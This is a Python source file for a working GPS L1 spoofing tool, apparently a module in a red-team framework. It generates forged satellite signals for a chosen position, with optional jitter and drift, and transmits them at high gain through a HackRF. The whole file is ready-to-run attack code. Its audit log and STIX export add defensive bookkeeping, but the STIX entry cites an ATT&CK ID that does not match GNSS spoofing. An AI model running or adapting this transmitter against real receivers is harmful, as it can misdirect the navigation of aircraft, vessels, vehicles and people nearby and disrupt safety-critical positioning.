#!/usr/bin/env python3
# Path: modules/attacks/gnss_spoofer.py
#

#   • Generates IQ samples with gps-sdr-sim (auto-fetches the nav-file if absent)  
#   • Transmits the stream through HackRF (auto-tests presence / gain bounds)  
#   • Streams status events to the Satellite-Defense Web-Socket dashboard  
#   • Logs every run in both JSONL audit‐trail & coloured console output  
#   • Supports a *dynamic-drift* mode to emulate gradual movement  
#   • Produces an ATT&CK STIX object for blue-team correlation  

import argparse
import json
import os
import random
import shutil
import subprocess
import sys
import time
from datetime import datetime, timedelta
from pathlib import Path
from typing import Tuple

import requests
import websocket  # pip install websocket-client

# ─────────────────────────────── constants ────────────────────────────── #
GPS_SDR_SIM = Path("./gps-sdr-sim").resolve()
NAV_FILE    = Path("brdc.n")                  # daily broadcast ephemeris
IQ_FILE     = Path("gps_spoof_signal.bin")
AUDIT_LOG   = Path("logs/cli_audit_log.jsonl")
STIX_OUT    = Path("results/stix_gnss_spoof.json")
DASH_URL    = "ws://localhost:8765"

DEFAULT_L1_FREQ = 1_575_420_000     # Hz
CONSOLE_COLORS  = os.isatty(1)

# ────────────────────────────── helpers ───────────────────────────────── #

def c(col: str, msg: str) -> str:
    if not CONSOLE_COLORS:
        return msg
    table = {"r":31, "g":32, "y":33, "b":34, "m":35, "c":36}
    return f"\033[{table[col]}m{msg}\033[0m"

def utc_now() -> str:
    return datetime.utcnow().replace(microsecond=0).isoformat() + "Z"

def ensure_dirs():
    for p in [AUDIT_LOG.parent, STIX_OUT.parent]:
        p.mkdir(parents=True, exist_ok=True)

def fetch_nav_file() -> None:
    """Download the latest broadcast ephemeris if not present."""
    if NAV_FILE.exists():
        return
    print(c("y", "[*] Downloading latest broadcast ephemeris (brdc.n)…"))
    url = "https://cddis.nasa.gov/archive/gnss/data/daily/"  #  ~350 kB
    # build URL: /yyyy/ddd/brdcddd0.yy*n.gz; use yesterday if UTC < 02 h
    now   = datetime.utcnow() - timedelta(hours=2)
    y, doy = now.year, int(now.strftime("%j"))
    yy     = str(y)[-2:]
    name   = f"brdc{doy:03d}0.{yy}n.Z"
    gz_url = f"{url}{y}/{doy:03d}/{name}"
    r      = requests.get(gz_url, timeout=15)
    r.raise_for_status()
    NAV_FILE.with_suffix(".Z").write_bytes(r.content)
    subprocess.run(["uncompress", NAV_FILE.with_suffix(".Z")], check=True)

def send_ws(evt_type: str, msg: str) -> None:
    try:
        ws = websocket.create_connection(DASH_URL, timeout=2)
        ws.send(json.dumps({"type": evt_type, "message": msg, "timestamp": utc_now()}))
        ws.close()
    except Exception:
        pass  # dashboard offline – no hard fail

def audit(entry: dict) -> None:
    with open(AUDIT_LOG, "a") as f:
        f.write(json.dumps(entry) + "\n")

def stix_doc(lat: float, lon: float, duration: int) -> None:
    stix = {
        "type":"bundle","id":"bundle--"+os.urandom(8).hex(),
        "objects":[
            {
                "type":"attack-pattern",
                "id":"attack-pattern--"+os.urandom(8).hex(),
                "name":"GNSS spoofing (signal replay)",
                "description":f"Spoofed GPS location to lat={lat}, lon={lon} for {duration}s",
                "created":utc_now(),
                "external_references":[
                    {"source_name":"mitre-attack","external_id":"T1190"}
                ]
            }
        ]
    }
    STIX_OUT.write_text(json.dumps(stix, indent=2))

# ────────────────────────── core functions ────────────────────────────── #

def build_iq(lat: float, lon: float, dur: int, jitter: float, dynamic: bool) -> Tuple[float,float]:
    """Generate the IQ file, applying jitter / drift if requested."""
    base_lat, base_lon = lat, lon
    if jitter:
        lat += random.uniform(-jitter, jitter)
        lon += random.uniform(-jitter, jitter)

    if dynamic:
        # construct a 2-point drift in the nav string (gps-sdr-sim supports -l "lat,lon,alt/delta_lat,delta_lon,delta_alt")
        dlat = random.uniform(-0.0005, 0.0005)
        dlon = random.uniform(-0.0005, 0.0005)
        loc  = f"{lat},{lon},100/{lat+dlat},{lon+dlon},100"
    else:
        loc  = f"{lat},{lon},100"

    cmd = [
        str(GPS_SDR_SIM),
        "-e", str(NAV_FILE),
        "-l", loc,
        "-d", str(dur),
        "-o", str(IQ_FILE)
    ]
    print(c("b", "[+] Generating spoofed IQ…"))
    subprocess.run(cmd, check=True)
    return lat, lon

def transmit(sample_rate: int, freq: int, gain: int):
    if not shutil.which("hackrf_transfer"):
        sys.exit(c("r", "[!] hackrf_transfer not found in PATH"))
    if not (0 <= gain <= 47):
        sys.exit(c("r", "[!] TX gain must be 0-47 dB"))

    cmd = [
        "hackrf_transfer",
        "-t", str(IQ_FILE),
        "-f", str(freq),
        "-s", str(sample_rate),
        "-x", str(gain),
        "-a", "1",   # amp on
        "-R"
    ]
    print(c("g", f"[+] Transmitting spoof @ {freq/1e6:.3f} MHz (sr={sample_rate/1e6:.2f} MS/s, gain={gain} dB)…"))
    send_ws("gnss_spoof_start", f"TX {freq/1e6:.3f} MHz L1 spoof start")
    subprocess.run(cmd)
    send_ws("gnss_spoof_end", "Spoofing stopped")

def cleanup():
    if IQ_FILE.exists():
        IQ_FILE.unlink()
        print(c("y", "[✓] Removed temporary IQ file"))

# ──────────────────────────────── cli ─────────────────────────────────── #

def main():
    ensure_dirs()

    p = argparse.ArgumentParser(
        description="High-fidelity GNSS (GPS L1) spoofing utility"
    )
    p.add_argument("--lat",  type=float, required=True, help="Latitude")
    p.add_argument("--lon",  type=float, required=True, help="Longitude")
    p.add_argument("--duration", type=int, default=300, help="IQ length (s)")
    p.add_argument("--sample-rate", type=int, default=2_600_000, help="Sample-rate (Hz)")
    p.add_argument("--frequency",   type=int, default=DEFAULT_L1_FREQ, help="TX frequency (Hz)")
    p.add_argument("--gain", type=int, default=40, help="TX gain 0-47 dB")
    p.add_argument("--jitter", type=float, default=0.0002, help="Random jitter radius (°)")
    p.add_argument("--dynamic-drift", action="store_true", help="Emulate smooth drift")
    args = p.parse_args()

    # safety checks
    if os.geteuid() != 0:
        sys.exit(c("r", "[!] Must run as root for HackRF TX"))
    if not GPS_SDR_SIM.exists():
        sys.exit(c("r", f"[!] {GPS_SDR_SIM} missing – compile gps-sdr-sim first"))
    fetch_nav_file()

    try:
        lat, lon = build_iq(args.lat, args.lon, args.duration, args.jitter, args.dynamic_drift)
        audit({
            "timestamp": utc_now(),
            "module": "gnss_spoofer",
            "target": {"lat": lat, "lon": lon},
            "duration": args.duration,
            "sample_rate": args.sample_rate,
            "frequency": args.frequency,
            "gain": args.gain
        })
        stix_doc(lat, lon, args.duration)
        transmit(args.sample_rate, args.frequency, args.gain)
    except KeyboardInterrupt:
        print(c("y", "\n[!] Spoofing interrupted by user"))
    except subprocess.CalledProcessError as e:
        print(c("r", f"[!] External tool error: {e}"))
    finally:
        cleanup()

if __name__ == "__main__":
    main()
